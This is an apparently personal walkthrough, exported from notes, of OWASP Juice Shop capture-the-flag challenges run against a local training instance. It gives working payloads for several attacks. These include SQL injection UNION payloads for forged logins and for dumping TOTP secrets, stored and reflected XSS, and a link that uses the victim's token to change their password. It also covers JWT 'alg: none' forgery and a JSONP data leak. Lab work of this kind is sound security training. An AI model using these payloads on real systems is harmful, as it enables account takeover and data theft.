+</p><p id="e5c8f2f4-1750-42e2-bdb0-23bc7b9e7cc5" class="">
+</p><p id="f54b4143-c533-49cc-ad52-c05912a57408" class="">
+</p><h2 id="6077af19-0c5b-468c-a5a0-07fcc7c95382" class="">19 -Vulnerable Library (Vulnerable Components)</h2><p id="bd6699c7-c569-4de3-8a54-4392e69bbefa" class="">Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment)</p><p id="92bcfa1e-cb63-4d09-a989-b7cbe9608717" class="">
+</p><p id="499a982b-0598-4ee1-9cfd-6147df2b964a" class="">Juice Shop depends on a JavaScript library with known vulnerabilities. Having the <code>package.json.bak</code> and using an online vulnerability database like <a href="https://retirejs.github.io/">Retire.js</a> or <a href="https://snyk.io/vuln">Snyk</a> makes it rather easy to identify it.</p><p id="24e165ba-2256-4767-8147-9639b29eed53" class="">+</p><ol id="d3f85282-f06a-47ff-8be4-773124545ba2" class="numbered-list" start="1"><li>Solve <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html#access-a-developers-forgotten-backup-file">Access a developer&#x27;s forgotten backup file</a></li></ol><ol id="79fc730e-27bf-4b2f-86d4-c765635f97f5" class="numbered-list" start="2"><li>Checking the dependencies in <code>package.json.bak</code> for known vulnerabilities online will give you a match (at least) for<ul id="20efd219-71f4-4e30-82ed-d6972ba72287" class="bulleted-list"><li><code>sanitize-html</code>: Sanitization of HTML strings is not applied recursively to input, allowing an attacker to potentially inject script and other markup (see <a href="https://snyk.io/vuln/npm:sanitize-html:20160801">https://snyk.io/vuln/npm:sanitize-html:20160801</a>)</li></ul><ul id="7942e250-1658-4578-8ded-9fcb21c5c62e" class="bulleted-list"><li><code>express-jwt</code>: Inherits an authentication bypass and other vulnerabilities from its dependencies (see <a href="https://app.snyk.io/test/npm/express-jwt/0.1.3">https://app.snyk.io/test/npm/express-jwt/0.1.3</a>)</li></ul></li></ol><ol id="8de01fb9-7e0e-4943-9667-e2211552f83d" class="numbered-list" start="3"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a><ol id="6f0858c6-ee50-46e8-a9a9-3267daf2eaf9" class="numbered-list" start="1"><li>Submit your feedback with the string pair <code>sanitize-html</code> and <code>1.4.2</code> appearing somewhere in the comment. Alternatively you can submit <code>express-jwt</code> and <code>0.1.3</code>..</li></ol><p id="7f39327e-4231-4b0b-aa45-d3bd108b2ba4" class="">
+</p><h2 id="117d2126-ad22-469c-91ff-5f313d342e1c" class="">20 - Server-side XSS Protection</h2><p id="a70775be-4e6d-4029-b7c5-ef2c8a9a1e05" class="">
+</p><p id="68e9666a-b60e-4ac2-aa2f-00621f7a70ad" class="">In the <code>package.json.bak</code> you might have noticed the pinned dependency <code>&quot;sanitize-html&quot;: &quot;1.4.2&quot;</code>. Internet research will yield a reported <a href="https://snyk.io/vuln/npm:sanitize-html:20160801">Cross-site Scripting (XSS)</a> vulnerability, which was fixed with version 1.4.3 - one release later than used by the Juice Shop. The referenced <a href="https://github.com/punkave/sanitize-html/issues/29">GitHub issue</a> explains the problem and gives an exploit example:</p><blockquote id="480ad273-b41c-41b0-afbd-42e59e4479d3" class="">Sanitization is not applied recursively, leading to a vulnerability to certain masking attacks. Example:I am not harmless: &lt;&lt;img src=&quot;csrf-attack&quot;/&gt;img src=&quot;csrf-attack&quot;/&gt; is sanitized to I am not harmless: &lt;img src=&quot;csrf-attack&quot;/&gt;Mitigation: Run sanitization recursively until the input html matches the output html.</blockquote><ol id="593fbce1-bf6e-4b07-bcaf-fd5410d96be3" class="numbered-list" start="1"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a>.</li></ol><ol id="d632bb88-309f-468e-b1aa-06fa82eca5ba" class="numbered-list" start="2"><li>Enter <code>&lt;&lt;script&gt;Foo&lt;/script&gt;iframe src=&quot;javascript:alert(</code>`xss`<code>)&quot;&gt;</code> as <em>Comment</em></li></ol><ol id="c180925b-3007-4068-aabf-38c2878209f6" class="numbered-list" start="3"><li>Choose a rating and click <em>Submit</em></li></ol><ol id="d04205a2-b903-46c6-9f4d-c20ab74e3ee6" class="numbered-list" start="4"><li>Visit <a href="http://localhost:3000/#/about">http://localhost:3000/#/about</a> for a first &quot;xss&quot; alert (from the <em>Customer Feedback</em> slideshow)</li></ol><p id="d433a656-0a46-4b58-9916-6f9ae7fac1af" class=""><code>&lt;&lt;script&gt;Foo&lt;/script&gt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt;</code></p><p id="275171bc-a6dd-4fbd-af61-d821530936ad" class="">
+</p><p id="8760b161-0cee-4325-82d9-2d02c2c2f44e" class="">
+</p><h2 id="0e3bb148-bc4f-452b-b9b3-452d95596a5a" class="">21 -HTTP-Header XSS</h2><p id="38d6a5d4-7380-438d-bf35-0b13cc9b7fac" class="">Perform a persisted XSS attack with <code>&lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt;</code> through an HTTP header.</p><p id="d0801df6-79db-4867-bebd-714683172090" class="">
+</p><ol id="d5f8a546-0c6c-4fe2-a075-297f2f1218be" class="numbered-list" start="1"><li>Login into application with valid credentials.</li></ol><ol id="e472725b-0ac9-427b-a1e5-f6c4ee1b3956" class="numbered-list" start="2"><li>once you logged in, now intercept the request in burpsuite and click on logout replace the header on on following request <p id="68b7a99e-b33e-493f-935f-88b05ebd856a" class=""><code><a href="http://localhost:3000/rest/saveLoginIp">http://localhost:3000/rest/saveLoginIp</a></code></p></li></ol><ol id="1691d288-33fa-4095-b5b3-eb006c18346e" class="numbered-list" start="3"><li>proprietary header <code>True-Client-IP</code>: 1.2.3.4</li></ol><ol id="7380464d-36df-477e-a134-b71c4f411c7d" class="numbered-list" start="4"><li>the JSON response you will notice <code>lastLoginIp: &quot;1.2.3.4&quot;</code> and after logging in again you will see <code>1.2.3.4</code> as your <em>IP Address</em> on <a href="http://localhost:3000/#/privacy-security/last-login-ip">http://localhost:3000/#/privacy-security/last-login-ip</a>.</li></ol><ol id="0b13083e-92a9-4158-b0da-02332af59df0" class="numbered-list" start="5"><li>Replay the request once more with <code>True-Client-IP: &lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt;</code> to solve this seriously obscure challenge.</li></ol><ol id="74226f3e-ac6d-4cfc-bce6-bd92af5fa921" class="numbered-list" start="6"><li>Log in again and visit <a href="http://localhost:3000/#/privacy-security/last-login-ip">http://localhost:3000/#/privacy-security/last-login-ip</a> see the alert popup.<figure id="25757214-6e37-423f-8bd5-0b7f036f8308" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-20_at_1.08.03_PM.png"><img style="width:672px" src="OWASP Juice Shop/Screenshot_2019-10-20_at_1.08.03_PM.png"/></a></figure></li></ol><p id="e4c24668-4955-444f-94ad-d95ad16bec84" class="">
+</p><p id="d553c41a-2987-407e-8747-eb059c9b966c" class="">
+</p><h2 id="6815483a-b8e6-4403-abf1-5cfcb6040c08" class="">22 - Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)</h2><p id="a3c1fa27-fd41-4c44-897e-494a30bf3bd6" class="">/Injection</p><p id="b14bdaf8-57db-4ed8-8243-5ea4f0bffe10" class="">
+</p><p id="405ea0cc-61cc-40db-9a95-347fd1f147eb" class="">
+</p><ol id="ea07e940-6fb1-4f52-ae89-a1c8ec07fa93" class="numbered-list" start="1"><li>Go to <a href="http://localhost:3000/#/login">http://localhost:3000/#/login</a> and try logging in with <em>Email</em> <code>&#x27;</code> and any <em>Password</em> while observing the Browser DevTools network tab.</li></ol><ol id="6762d7fc-4631-4f89-b679-854d7d25cf3d" class="numbered-list" start="2"><li>You will notice the SQL query for the login in the error being thrown: <code>&quot;sql&quot;: &quot;SELECT * FROM Users WHERE email = &#x27;&#x27;&#x27; AND password = &#x27;339df5aeae5bc6ae557491e02619c5dd&#x27; AND deletedAt IS NULL&quot;</code></li></ol><ol id="9fee4760-c249-4f5a-9115-75f20a03b097" class="numbered-list" start="3"><li>Solve <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#exfiltrate-the-entire-db-schema-definition-via-sql-injection">Exfiltrate the entire DB schema definition via SQL Injection</a> to learn the exact column names of the <code>Users</code> table.</li></ol><ol id="799ad2ee-d37c-4fa1-9026-2cf4cb168706" class="numbered-list" start="4"><li>Prepare a <code>UNION SELECT</code> payload what will a) ensure there is no result from the original query and b) will add the needed user on-the-fly using static values in the query.</li></ol><ol id="86596423-1310-48d7-bb9f-5b146a1743d1" class="numbered-list" start="5"><li>Log in with <em>Email</em> <code>&#x27; UNION SELECT * FROM (SELECT 15 as &#x27;id&#x27;, &#x27;&#x27; as &#x27;username&#x27;, &#x27;acc0unt4nt@juice-sh.op&#x27; as &#x27;email&#x27;, &#x27;12345&#x27; as &#x27;password&#x27;, &#x27;accounting&#x27; as &#x27;role&#x27;, &#x27;1.2.3.4&#x27; as &#x27;lastLoginIp&#x27; , &#x27;default.svg&#x27; as &#x27;profileImage&#x27;, &#x27;&#x27; as &#x27;totpSecret&#x27;, 1 as &#x27;isActive&#x27;, &#x27;1999-08-16 14:14:41.644 +00:00&#x27; as &#x27;createdAt&#x27;, &#x27;1999-08-16 14:33:41.930 +00:00&#x27; as &#x27;updatedAt&#x27;, null as &#x27;deletedAt&#x27;)--</code></li></ol><ol id="aeb49f39-7c59-4dab-80fa-2e17c59d6710" class="numbered-list" start="6"><li>This will trick the application backend into handing out a valid JWT token and thus establishing a user session.</li></ol><p id="58883843-c556-4d86-a6dd-814e85d014fb" class="">
+</p><p id="ec1259ba-133c-47d6-99ad-8a15551ad662" class="">
+</p><p id="fbab2a60-8cd6-40af-b70d-1b87111aa545" class="">—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   </p><h1 id="a43c6f7f-8d69-48ff-824c-376414f2568b" class="">LEVEL -5  </h1><p id="1615c379-0f50-4a94-a7d1-9d9f84b6102e" class="">—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  </p><p id="3743adb8-53e7-4304-be90-391c56b8c911" class="">
+</p><h2 id="fae5050a-6b5f-491b-84f6-d20df5279a1d" class="">1- Blockchain Hype (Learn about the Token Sale before its official announcement.) ~ Security through Obscurity</h2><p id="dd795716-ec6b-4b73-b99e-7f845cc5c5e0" class="">
+</p><p id="af0e20bd-64c6-465f-9bde-a20aadef6d82" class="">///</p><p id="b16bffb2-aa2c-46b1-ba82-803f468778fe" class="">
+</p><p id="8814d0eb-f0b8-4b29-911c-fef28bd07af7" class="">
+</p><h2 id="d896cd5b-73ef-435e-995b-b20ef16a437e" class="">2 -Change Bender&#x27;s Password </h2><h3 id="14153486-b087-4be7-b399-1109569ff757" class=""><code>(Change Bender&#x27;s password into </code><mark class="highlight-brown"><strong><code>slurmCl4ssic</code></strong></mark><code> without using SQL Injection or Forgot Password.)</code></h3><p id="1fe76ac7-d0a4-4f33-b1b6-a64cee6bdb57" class="">
+</p><p id="5f39e5f4-6f72-4567-893b-a621659be5cb" class="">(use postman tool)</p><ol id="ee8889d6-31c9-4a8a-acdd-179a2823901e" class="numbered-list" start="1"><li>Log in as anyone.</li></ol><ol id="57057e3b-b7e1-4d1f-9273-1f29d4ea794d" class="numbered-list" start="2"><li>Probe the responses of <code>/rest/user/change-password</code> on various inputs:<ul id="412c81d5-6fa5-47a1-9bf1-f5385d1cfc44" class="bulleted-list"><li><a href="http://localhost:3000/rest/user/change-password?current=A&amp;new=B&amp;repeat=B">http://localhost:3000/rest/user/change-password?current=A&amp;new=B&amp;repeat=B</a> <p id="266883a7-6edf-4f62-a2bc-e9989b7a17d9" class="">says <code>Current password is not correct.</code></p></li></ul><ul id="55bbb7dd-c059-483f-a07e-28d62bc65c9d" class="bulleted-list"><li><a href="http://localhost:3000/rest/user/change-password?new=B&amp;repeat=B">http://localhost:3000/rest/user/change-password?new=B&amp;repeat=B</a> <p id="3682555e-1b31-4622-b3dd-a2161f7ead2d" class="">yields a <code>200</code> success returning the updated user as JSON!</p></li></ul></li></ol><ol id="2c1ff0f1-1348-4bbf-acd4-852f2c6bc855" class="numbered-list" start="3"><li>Now <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#log-in-with-benders-user-account">Log in with Bender&#x27;s user account</a> using SQL Injection.</li></ol><ol id="6a4a8541-bba5-4b8c-91d4-13cf8c39b650" class="numbered-list" start="4"><li>Craft a GET request with Bender&#x27;s <code>Authorization Bearer</code> header to <a href="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic">http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic</a> to solve the challenge.</li></ol><p id="7b97800a-fe52-4259-abb5-f1a9b83f577c" class="">
+</p><figure id="71d288c6-591f-4eec-a418-ce22e1ab8058" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-20_at_2.21.37_PM.png"><img style="width:1440px" src="OWASP Juice Shop/Screenshot_2019-10-20_at_2.21.37_PM.png"/></a></figure><p id="77fff8df-349c-48cb-be05-a4eb6f626823" class="">
+</p><p id="ff3d8f60-5611-49e7-9db0-ca8001952079" class="">
+</p><p id="535b7f32-d7cc-4570-8877-cf3abd9ff297" class="">
+</p><h3 id="4fd134e8-b2e7-4897-a097-dbf6e80738f8" class=""><strong>Bonus Round: Delivering the attack via reflected XSS</strong></h3><p id="631b7206-fab7-480b-80b0-a92a0f3be560" class="">If you want to craft an actually realistic attack against <code>/rest/user/change-password</code> that you could send a user as a malicious link, you will have to invest a bit extra work, because a simple attack like <em>Search</em> for <code>&lt;img src=&quot;http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic&quot;&gt;</code> will not work. Making someone click on the corresponding attack link <a href="http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E">http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E</a> will return a <code>500</code> error when loading the image URL with a message clearly stating that your attack ran against a security-wall: <code>Error: Blocked illegal activity</code></p><p id="9fb40deb-436c-4b70-aa85-42a52a0f9ce0" class="">To make this exploit work, some more sophisticated attack URL is required:</p><p id="f22e85ab-7d20-418b-817e-b90ca2dc1e29" class=""><a href="http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E">http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E</a></p><p id="1cd11589-53f7-4d7a-93ca-f2fb9d44accf" class="">Pretty-printed this attack is easier to understand:</p><pre id="fbbe0d6f-cd8c-436f-acff-b6bf80496c77" class="code"><code>&lt;iframe src=&quot;javascript:xmlhttp = new XMLHttpRequest();
+   xmlhttp.open(&#x27;GET&#x27;, &#x27;http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;amp;repeat=slurmCl4ssic&#x27;);
+   xmlhttp.setRequestHeader(&#x27;Authorization&#x27;,`Bearer=${localStorage.getItem(&#x27;token&#x27;)}`);
+   xmlhttp.send();&quot;&gt;
+&lt;/iframe&gt;</code></pre><p id="fbcc4172-b224-460b-96e9-ac5606d160a6" class="">Anyone who is logged in to the Juice Shop while clicking on this link will get their password set to the same one we forced onto Bender!</p><p id="62e0947e-1e66-4e18-9a5e-afee4598086b" class="">👏 Kudos to Joe Butler, who originally described this advanced XSS payload in his blog post <a href="https://incognitjoe.github.io/hacking-the-juice-shop.html">Hacking(and automating!) the OWASP Juice Shop</a>.</p><p id="18091912-e1fd-40fb-b82c-79b633fbc0ad" class="">
+</p><p id="23c456ad-27a0-4550-a7f7-44f3907b9fb2" class="">
+</p><p id="66e4ce31-afee-47c4-bde5-9c56d2c17599" class="">
+</p><p id="78fa7f35-c77c-4c49-89b1-94eedb1a0e16" class="">
+</p><h2 id="703cd035-6e0c-4a23-99f0-51992be8a765" class="">3 -Leaked Access Logs </h2><h3 id="f5e0f5ac-8c56-4879-8588-f4876095e3a5" class="">Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to. (Creating a new account with the same password does not qualify as a solution.)</h3><p id="31d98633-905b-4fae-b246-20ba3ff7fcdb" class="">
+</p><ol id="8891a0a7-000b-4955-a506-fbc52604ccda" class="numbered-list" start="1"><li>Visit<code> </code><code><a href="https://stackoverflow.com/questions/tagged/access-log">https://stackoverflow.com/questions/tagged/access-log</a></code> to find all questions tagged with access-log in this popular platform</li></ol><ol id="5f6ae082-918e-49f8-818b-167ee004cd43" class="numbered-list" start="2"><li>.Visit <a href="https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan">https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan</a> to find more unambiguous URL paths from the Juice Shop in it</li></ol><ol id="bc542a3c-01ff-4934-b2a6-9beedc711669" class="numbered-list" start="3"><li>you will get <a href="https://pastebin.com/4U1V1UjU">https://pastebin.com/4U1V1UjU</a></li></ol><p id="9534589e-0b02-4283-ae3d-c9b2baa31fb0" class="">(search here for <strong>password</strong>)</p><p id="af363e49-5ce5-4cc7-8198-d7d11fa1070c" class=""> 4. you get this as a current &amp; new  password but while changing password it failed means the password is still current password</p><p id="65d89ddc-0a9e-40a2-a4e8-4f7a810f89c9" class=""><code>0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&amp;6lB</code></p><p id="4d15a5ca-6c87-4bbb-8f97-049ba290fa72" class="">5. hash the known password with <code>MD5</code> and compare it to the password hashes harvested from <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a>
+Either way you will conclude that the password belongs to <code>J12934@juice-sh.op </code>so using this as Email and<code> 0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&amp;6lB </code>as Password<code> </code>on <code><a href="http://localhost:3000/#/login">http://localhost:3000/#/login</a></code> will solve the challenge</p><p id="53e81e3b-361d-40f0-ad5a-220e1b93e555" class="">6. but it will not work you need to do URL decode for password and here you get the original password <mark class="highlight-brown_background"><code><strong>0Y8rMnww$*9VFYE§59-!Fg1L6t&amp;6lB</strong></code></mark></p></li></ol><p id="e8d97bc7-563a-45dd-9c5a-f5bb24988d5e" class="">
+</p><h2 id="7059301d-15cf-48c8-8a92-f01830b894b6" class="">4 - Email Leak</h2><h3 id="9f552c6d-d3a8-42ab-89d7-10d91c031398" class="">(Perform an unwanted information disclosure by accessing data cross-domain.)</h3><p id="4c4c494f-8ed6-417f-bbef-4225290a6e94" class="">
+</p><ol id="4f66667b-7cc9-4d89-875c-69ccddb14b9d" class="numbered-list" start="1"><li>Find a request to the <code>/rest/user/whoami</code> API endpoint. Notice that you can remove the &quot;Authorization&quot; header and it still works.<figure id="b3b37de8-56b5-4afc-880d-622279ec7890" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-20_at_3.23.20_PM.png"><img style="width:1423px" src="OWASP Juice Shop/Screenshot_2019-10-20_at_3.23.20_PM.png"/></a></figure></li></ol><ol id="661650da-b18b-480a-b3b0-179a5926af36" class="numbered-list" start="2"><li>Add a URL parameter called &quot;callback&quot;. This will cause the API to return the content as a JavaScript fragment (JSONP) rather than just a standard JSON object.<figure id="2c7273cb-9e01-452d-a325-c821f3e097e2" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-20_at_3.23.12_PM.png"><img style="width:672px" src="OWASP Juice Shop/Screenshot_2019-10-20_at_3.23.12_PM.png"/></a></figure><p id="32635c8f-6851-4b96-a0a4-fb97982c7659" class=""><code><a href="http://localhost:3000/rest/user/whoami">http://localhost:3000</a></code><code>/rest/user/whoami?callback=anyone</code></p><p id="366e921a-3243-4ff9-b705-0d614877b225" class="">
+</p><h2 id="01c96512-3d75-41d7-b18a-bb9b6287f291" class="">5 -Extra Language</h2><h3 id="723dd487-1886-42a5-9409-18b32ec3f83e" class="">Retrieve the language file that never made it into production.</h3><p id="dbc5fd01-99b5-4c6a-a24a-756875f7ba2b" class="">
+</p><ol id="eaeaa310-7eb1-45b3-87bf-bb9f81e3193f" class="numbered-list" start="1"><li>change the language and while doing so, check for network tab for the request<ul id="5cc28ff6-a4a8-44a2-b646-df55c1dd2b40" class="bulleted-list"><li><a href="http://localhost:3000/i18n/en.json">http://localhost:3000/i18n/en.json</a></li></ul><ul id="1d054b9e-97ae-4a03-99ee-4e74b7cf077a" class="bulleted-list"><li><a href="http://localhost:3000/i18n/de_DE.json">http://localhost:3000/i18n/de_DE.json</a></li></ul><ul id="1f45563f-2493-43de-ab15-20e651e27cbd" class="bulleted-list"><li><a href="http://localhost:3000/i18n/nl_NL.json">http://localhost:3000/i18n/nl_NL.json</a></li></ul><ul id="f650b27e-40c5-4ade-b2af-3b1aa9df69f2" class="bulleted-list"><li>etc.</li></ul></li></ol><ol id="6697eddc-ae6d-4a56-afa5-aa7bc447b36b" class="numbered-list" start="2"><li>(<code>aa_AA</code>, <code>ab_AA</code>, ..., <code>zz_ZY</code>, <code>zz_ZZ</code>) would still <strong>not</strong> solve the challenge, if we do brute-force then also get failed</li></ol><ol id="c0b73520-cc91-4589-97da-0f86419ae76a" class="numbered-list" start="3"><li>The hidden language is <em>Klingon</em> which is represented by a three-letter code <code>tlh</code> with the dummy country code <code>AA</code>.</li></ol><ol id="fcebe7ae-698b-4b88-bcfd-99d110dc4fd6" class="numbered-list" start="4"><li>Request <a href="http://localhost:3000/assets/i18n/tlh_AA.json">http://localhost:3000/assets/i18n/tlh_AA.json</a> to solve the challenge. majQa&#x27;!</li></ol><p id="ca069bf4-099e-4de6-8361-ed045826a3e6" class="">Instead of expanding your brute force pattern (which is not a very obvious decision to make) you can more easily find the solution to this challenge by investigating which languages are supported in the Juice Shop and how <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/translation.html">the translations</a> are managed. This will quickly bring you over to <a href="https://crowdin.com/project/owasp-juice-shop">https://crowdin.com/project/owasp-juice-shop</a> which immediately spoilers <em>Klingon</em> as a supported language. Hovering over the corresponding flag will eventually spoiler the language code <code>tlh_AA</code>.</p><p id="2d240541-c890-4217-91ab-554a7b061806" class="">
+</p><h2 id="550e7c40-6485-4f87-8932-03a2dd7bd319" class="">6 -Two Factor Authentication</h2><h3 id="86dfc6fa-e2dc-47f2-acb3-2195f2134056" class="">Solve the 2FA challenge for user &quot;wurstbrot&quot;</h3><p id="b7cac522-4c06-4ffd-ae20-2d5609198004" class="">(Disabling, bypassing or overwriting his 2FA settings does not count as a solution)</p><p id="b0a1bc05-f14d-4c10-906c-9381a7017d53" class="">
+</p><p id="33f265bc-d39e-44f1-9086-c0372a937aa6" class="">to solve this challenge we are going to use SQL injection for getting 2FA code.</p><ol id="5e887c76-392a-4534-99ab-06d3f72efbcd" class="numbered-list" start="1"><li>we can get email address of wurstbrot by Solving Retrieve a list of all user credentials via SQL Injection challenge.</li></ol><ol id="8594cd07-1348-4e6c-b08b-c3e6489b0edd" class="numbered-list" start="2"><li>we get to know the email address is <code>wurstbrot@juice-sh.op</code></li></ol><ol id="b85ea595-b076-4142-b81a-fe768d0e243c" class="numbered-list" start="3"><li>now try to login with the email using SQL injection<p id="a547ff99-b659-4af6-8a2d-7414589b244e" class=""><code>wurstbrot@juice-sh.op&#x27; --</code></p><p id="f360a75f-37f8-4ac3-87b1-d55eb26bb575" class="">but now you can see a 2FA is implemented asking for token.</p></li></ol><p id="b6a85068-9896-4c79-af3c-5921eb80eb3f" class=""><code>http://localhost:3000/rest/products/search?q=&#x27;)) union select &#x27;1&#x27;,id,email,password,</code><strong><code>2fa</code></strong><code>,null,null,null,null from users--</code></p><p id="153f134c-b7c4-404b-97a2-81a8e9921b84" class="">now simply replace any null with<strong> 2fa,2fatoken,2fakey,totp,totpkey,totpsecret</strong></p><p id="2eee972e-f709-4b1a-8e30-4358e214cb3a" class="">and finally we get a valid column name exist : <code><strong>totpsecret</strong></code></p><p id="a6089331-6b8a-471d-92a3-637a545bc829" class=""><code>http://localhost:3000/rest/products/search?q=&#x27;)) union select &#x27;1&#x27;,id,email,password,</code><strong><code>totpsecret</code></strong><code>,null,null,null,null from users--</code></p><p id="efd406a5-a0f5-4e86-bb0a-51953844527f" class="">
+</p></li></ol><p id="6e1cb9da-2dbd-4177-8841-45e3f157b82f" class="">
+</p><ol id="eede94c8-1523-4d8b-8cb5-ecb3bbac864c" class="numbered-list" start="1"><li>find the entry of user <code>wurstbrot@juice-sh.op</code> with <code>&quot;image&quot;:&quot;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&quot;</code> whereas all other users have <code>&quot;image&quot;:&quot;&quot;</code> set.</li></ol><ol id="d0b9dc80-33d8-4b21-aafe-484392d924e7" class="numbered-list" start="2"><li>Using your favorite 2FA application (e.g. <a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2">Google Authenticator</a>) create a new entry, but instead of scanning any QR code type in the key <code>IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH</code> manually.</li></ol><ol id="94c645f2-e5e1-45d6-b620-d32d2eec11ad" class="numbered-list" start="3"><li>Go to<h3 id="7262a74e-6a99-47ac-b82a-09f6f7b5c8f8" class="">and use SQL Injection to log in with <code>wurstbrot@juice-sh.op&#x27;--</code> as <em>Username</em> and anything as <em>Password</em>.</h3></li></ol><ol id="0a48e24e-111a-4f75-8eae-c95d5162ec36" class="numbered-list" start="4"><li>You will be presented with the <em>Two Factor Authentication</em> input screen where you now have to type in the 6-digit code currently displayed on your 2FA app</li></ol><p id="717f25bd-8773-4a2f-98ca-dc8dcd554b67" class="">
+</p><p id="48648cf7-c42f-40cd-a266-887ed4330ebf" class="">
+</p><p id="11325ca9-cf17-4c1c-a0d0-e025b64ac341" class="">
+</p><h2 id="6a95d087-76ec-4d5e-94b8-8c2dd973f92a" class="">7 - Unsigned JWT</h2><h3 id="e9b23427-a86c-4ce1-83ae-1b2607c74ae0" class="">Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op.</h3><p id="665ea05a-3ac1-4237-91d7-237adb6b88b8" class="">
+</p><ol id="8511e4ca-668f-4fb7-a37d-997be09033da" class="numbered-list" start="1"><li>first got an option where you can see an Authorisation header responsible for making request to server.</li></ol><ol id="7a1ebade-d049-4018-b6b8-6836be1990ae" class="numbered-list" start="2"><li>here we intercept a request with normal user on this endpoint <p id="b52aa80b-4bc8-4d33-bd9d-ac53769fb10d" class=""><code><a href="http://localhost:3000/rest/user/data-export">http://localhost:3000/rest/user/data-export</a></code></p><p id="8058618d-5d0e-444f-9c58-8e2a75c15bcc" class="">when we click on export simply we get an request intercept it,  and</p><p id="5fc2951b-16fd-44ee-b166-7c9a11c6784f" class="">the authorization header, now go to jwt.io</p></li></ol><ol id="a3d1fef1-6e36-4a1e-9502-4d0b5f6b7044" class="numbered-list" start="3"><li>Copy the JWT (i.e. everything after Bearer in the Authorization header) and decode it.</li></ol><ol id="672517c9-b58a-4e4d-8662-3644e70de7f3" class="numbered-list" start="4"><li>in encoded token replace eyJhbGciOiJ<strong>S </strong>with eyJhbGciOiJ<strong>I </strong>in starting of token, there is flaw in jwt.io<figure id="b75e8ce7-a6d3-4e29-b2ef-aa5287e4944e" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-21_at_10.34.25_AM_(2).png"><img style="width:460px" src="OWASP Juice Shop/Screenshot_2019-10-21_at_10.34.25_AM_(2).png"/></a></figure></li></ol><p id="3495b979-6d4e-48b9-a0eb-154509d3b232" class="">
+</p><p id="0d109c78-f4c9-4dee-a217-6cf18122de88" class=""> 5. under payload property on right side, we need to change email with <code>jwtn3d@juice-sh.op</code></p><p id="d717ba44-7808-4de2-b712-284feb2d6fdb" class=""> 6. under header property replace the on right side,<code> &quot;alg&quot;: &quot;none&quot;</code></p><p id="e146c67b-764c-4c39-acda-6a3e4a466929" class="">
+</p><figure id="e0d0d7d7-72f6-4d7d-8d84-d51ded2ab241" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-21_at_10.38.51_AM_2.png"><img style="width:983px" src="OWASP Juice Shop/Screenshot_2019-10-21_at_10.38.51_AM_2.png"/></a></figure><p id="01c93f20-cd27-47f7-8986-08900fce3379" class="">
